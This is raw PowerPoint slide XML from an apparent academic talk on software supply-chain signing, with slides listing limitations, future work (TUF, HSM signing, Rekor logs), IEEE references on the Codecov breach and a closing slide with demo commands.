      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="3154680"/>
            <a:ext cx="2514600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Leaked key valid until revoked</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CRL &amp; provenance not yet signed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Demo keys unencrypted PEM</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Audit log not tamper-evident</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Rounded Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="2697480"/>
            <a:ext cx="2697480" cy="3520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44768" y="2743200"/>
            <a:ext cx="2468880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Future work</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="3154680"/>
            <a:ext cx="2514600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Sign CRL / trust store (TUF)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>HSM / cloud KMS + MFA signing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Hash-chained / Rekor log</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Real TLS 1.3 registry, SBOM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References (IEEE)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="1371600"/>
            <a:ext cx="8321040" cy="4846320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[1] Codecov, "Bash Uploader Security Update," Apr. 2021. https://about.codecov.io/security-update/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[2] J. Menn and R. Satter, "Codecov hackers breached hundreds of restricted customer sites - sources," Reuters, Apr. 19, 2021.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[3] HashiCorp, "HCSEC-2021-12 - Codecov Security Event and HashiCorp GPG Key Exposure," Apr. 2021.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[4] NIST, "Secure Hash Standard (SHS)," FIPS 180-4, 2015.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[5] S. Josefsson and I. Liusvaara, "Edwards-Curve Digital Signature Algorithm (EdDSA)," RFC 8032, 2017.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[6] A. Rundgren, B. Jordan, S. Erdtman, "JSON Canonicalization Scheme (JCS)," RFC 8785, 2020.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[7] E. Rescorla, "The Transport Layer Security (TLS) Protocol Version 1.3," RFC 8446, 2018.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[8] M. Souppaya et al., "Secure Software Development Framework v1.1," NIST SP 800-218, 2022.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[9] OpenSSF, "SLSA Specification v1.0," 2023. https://slsa.dev</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[10] A. Shostack, Threat Modeling: Designing for Security, Wiley, 2014.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[11] Z. Newman, J. S. Meyers, S. Torres-Arias, "Sigstore: Software Signing for Everybody," ACM CCS, 2022.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[12] E. Barker, "Recommendation for Key Management," NIST SP 800-57 Pt. 1 Rev. 5, 2020.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p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="2103120"/>
            <a:ext cx="8412480" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="4400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Thank You</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="3017520"/>
            <a:ext cx="8412480" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2600" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Questions?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="4206240"/>
            <a:ext cx="8412480" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>python demo.py -i   ·   python tests/test_supply_chain.py   ·   python dashboard/app.py</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>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3</TotalTime>
  <Words>50</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (4:3)</PresentationFormat>
  <Paragraphs>24</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Cambria</vt:lpstr>
      <vt:lpstr>Lucida Sans</vt:lpstr>
      <vt:lpstr>Neue Haas Grotesk Text Pro</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Axis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Principal</dc:creator>
  <cp:lastModifiedBy>FACULTY 3</cp:lastModifiedBy>
  <cp:revision>30</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-10-24T06:15:58Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-08T06:27:48Z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6B284E3421846AF5F518FB68502C439A_43</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="KSOProductBuildVer">
    <vt:lpwstr>1033-6.15.0.8733</vt:lpwstr>
  </property>
</Properties>
</file>